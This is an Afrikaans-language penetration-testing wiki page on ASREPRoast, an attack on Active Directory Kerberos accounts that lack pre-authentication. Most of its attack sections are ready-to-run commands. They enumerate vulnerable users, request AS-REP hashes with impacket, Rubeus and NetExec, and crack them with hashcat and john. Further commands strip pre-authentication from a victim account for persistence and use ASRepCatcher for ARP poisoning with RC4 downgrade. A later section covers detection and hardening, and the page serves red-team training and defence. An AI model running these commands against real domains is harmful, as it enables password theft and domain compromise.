# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is ’n sekuriteitsaanval wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. Hierdie kwesbaarheid stel aanvallers in staat om by die Domain Controller (DC) ’n versoek om ’n gebruiker te autentiseer, te rig sonder dat hulle die gebruiker se wagwoord nodig het. Die DC antwoord dan met ’n boodskap wat met die gebruiker se wagwoordafgeleide sleutel geënkripteer is. Aanvallers kan probeer om dit offline te kraak om die gebruiker se wagwoord te ontdek.

Die belangrikste vereistes vir hierdie aanval is:

- **Gebrek aan Kerberos pre-authentication**: Teikengebruikers moet nie hierdie sekuriteitsfunksie geaktiveer hê nie.
- **Verbinding met die Domain Controller (DC)**: Aanvallers moet toegang tot die DC hê om versoeke te stuur en geënkripteerde boodskappe te ontvang.
- **Opsionele domeinrekening**: Met ’n domeinrekening kan aanvallers kwesbare gebruikers doeltreffender deur LDAP-navrae identifiseer. Sonder so ’n rekening moet aanvallers gebruikersname raai.

#### Kwesbare gebruikers opspoor (domeinbewyse nodig)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Versoek AS_REP-boodskap

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus versoek by verstek **RC4**, dus wys Gebeurtenis-ID **4768** gewoonlik **preauth type 0** en **ticket encryption type 0x17**. As jy **`/aes`** byvoeg (of RC4 vir die teiken gedeaktiveer is), verwag eerder **AES etypes**.<sup>[[2]](#references)</sup>

#### Vinnige eenreëls (Linux)

- Lys eers potensiële teikens (bv. uit gelekte bou-paaie) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast 'n hele gebruikersnaamlys sonder geldige creds met NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- As jy wel creds het, laat NetExec LDAP navraag doen en elke roastable rekening vir jou versoek: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- As die uitvoer met **`$krb5asrep$23$`** begin, kraak dit met Hashcat **`-m 18200`**. As dit met **`$krb5asrep$17$`** of **`$krb5asrep$18$`** begin, verkies John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Kraak

Moenie aanvaar dat elke AS-REP-roast RC4 gebruik nie. Moderne gereedskap kan **RC4** (`$krb5asrep$23$`) of **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) teruggee, afhangend van die aangevraagde/onderhandelde enctype. **`hashcat -m 18200`** is vir **etype 23**, terwyl **John** `krb5asrep` direk vir **17/18/23** hanteer.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Volharding

Dwing **preauth** af om nie vir 'n gebruiker vereis te word vir wie jy **GenericAll**-toestemmings (of toestemmings om eienskappe te skryf) het nie:

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Opsporing en verharding

’n Suksesvolle **AS-REP-versoek sonder voorafverifikasie** lewer ’n **4768**-gebeurtenis op die DC met `Status=0x0` en `PreAuthType=0`; dit teken ’n versoek aan, nie bewys dat iemand die antwoord gekraak of die rekening gekompromitteer het nie. Moenie RC4 as ’n vereiste vir opsporing stel nie: `TicketEncryptionType=0x17` is ’n nuttige sein van swak enkripsie, maar ’n aanvaller kan AES aanvra (gebeurtenislogwaardes `0x11`/`0x12`). Op Windows Server 2016 en later, met die kumulatiewe opdatering van 14 Januarie 2025 (of nuwer), wys weergawe 2 van gebeurtenis 4768 ook `ClientAdvertizedEncryptionTypes`, die ondersteunde etipes en beskikbare sleutels van die rekening/DC.<sup>[[5]](#references)</sup>

’n Praktiese soektog merk ’n kliënt wat slegs RC4 adverteer terwyl die rekening AES-sleutels het, en korreleer dan vlae versoeke vanaf een bron-IP oor verskeie gebruikers sonder voorafverifikasie. Stel wettige uitsonderings as basislyn, eerder as om ’n waarskuwing vir elke `PreAuthType=0`-gebeurtenis te genereer.

Vir toeskrywing, normaliseer die `IpAddress`-veld (wat IPv4-adresse met `::ffff:`-voorvoegsel kan bevat) en vergelyk die tydvenster met 4769-dienskaartjie- of 5140-deeltoeganggebeurtenisse. Dié gebeurtenisse kan rekeninge noem wat vanaf dieselfde adres aktief was, maar ’n AS-REP-versoek sonder voorafverifikasie vereis geen geverifieerde rekening nie. Gedeelde gashere, NAT, gevolmagtigdes en veelvuldige sessies beteken dat ’n ooreenstemmende IP **nie** die persoon of rekening identifiseer wat die AS-REQ gestuur het nie. Behandel die verwante rekeninge as leidrade vir ondersoek en bevestig dit met eindpunt- of netwerkbewyse.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Die blywende oplossing is om **Do not require Kerberos preauthentication** af te skakel vir elke gebruiker wat dit nie streng nodig het nie, en om blootgestelde rekeningwagwoorde te verander. As ’n uitsondering nie verwyder kan word nie, gebruik ’n lang, willekeurig gegenereerde wagwoord en minimale voorregte. As RC4 afgeskakel word, neem die kraakkoste toe, maar dit verwyder nie die moontlikheid van roasting nie, aangesien AES AS-REP-antwoorde steeds vanlyn gekraak kan word.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast sonder geloofsbriewe

’n Aanvaller op die pad kan die AS-REP vaslê wat tydens ’n normale, voorafgeverifieerde AS-uitruiling teruggestuur word, en die geënkripteerde deel daarvan vir vanlyn kraking formateer. Anders as klassieke ASREPRoasting, vereis dit nie `DONT_REQ_PREAUTH` nie; dit lewer egter slegs rekeninge op waarvan die Kerberos-uitruiling werklik onderskep word. **ASRepCatcher** verkry die posisie by verstek met eenrigting-ARP-poisoning, of kan verkeer van ’n ander MitM-tegniek met `--disable-spoofing` verwerk.<sup>[[6]](#references)</sup>\
As jy die verwante truuk sonder geloofsbriewe wil sien wat ’n **dienskaartjie** in plaas van ’n **TGT** van ’n hoofentiteit sonder voorafverifikasie teruggee, sien [Kerberoast](kerberoast.md).

In `relay`-modus stuur [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) onderskepte AS-REQ’s aan en dwing **RC4** af wanneer albei kante dit steeds toelaat. `listen` verander nie pakkette nie en vang dus die koderingtipe vas waaroor die kliënt en DC onderhandel het. Beperk poisoning met `-t`/`-tf` waar moontlik, eerder as om die hele subnet te raak.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Gebeurtenis 4768: ’n Kerberos-verifikasiekaartjie is aangevra](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Sekuriteitsgebeurtenis 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Sekuriteitsgebeurtenis 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
